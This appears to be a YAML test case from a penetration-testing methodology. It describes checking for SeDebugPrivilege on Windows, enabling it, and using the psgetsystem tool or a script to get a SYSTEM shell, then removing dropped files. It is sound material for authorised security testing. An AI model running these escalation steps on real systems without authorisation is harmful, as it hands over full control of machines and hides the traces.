---
testcase: Check for the SeDebugPrivilege and perform Remote Code Execution as SYSTEM via scripts
platforms: 
  - AD
  - Windows
methodology: 
  - BlackBox
  - GreyBox
references:
  - https://github.com/decoder-it/psgetsystem
  - https://notes.dollarboysushil.com/windows-privilege-escalation/user-privileges/sedebugprivilege
how-to-test: |
  **Enumeration:**
  1. Run `whoami /priv` in PowerShell or Command Prompt to verify SeDebugPrivilege.
  2. If SeDebugPrivilege is not enabled, use a tool like PoshPrivilege:
     - `Enable-Privilege -Privilege SeDebugPrivilege`
  3. List processes (with `tasklist`) and identify one running as SYSTEM.
  
  **Exploitation:**
  4. Use a tool like psgetsystem to impersonate SYSTEM:
     - Run: `.\psgetsystem.exe cmd.exe` to spawn a SYSTEM shell.
  5. Alternatively, execute a SYSTEM-level PowerShell script:
     - Set execution policy: `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine`
     - Unblock the script if needed: `Unblock-File -Path .\yourscript.ps1`
     - Run your SYSTEM-level script.
  6. Confirm SYSTEM privileges by running `whoami` (expected: nt authority\system).
  7. Clean up any dropped files or restore original privileges afterward.
---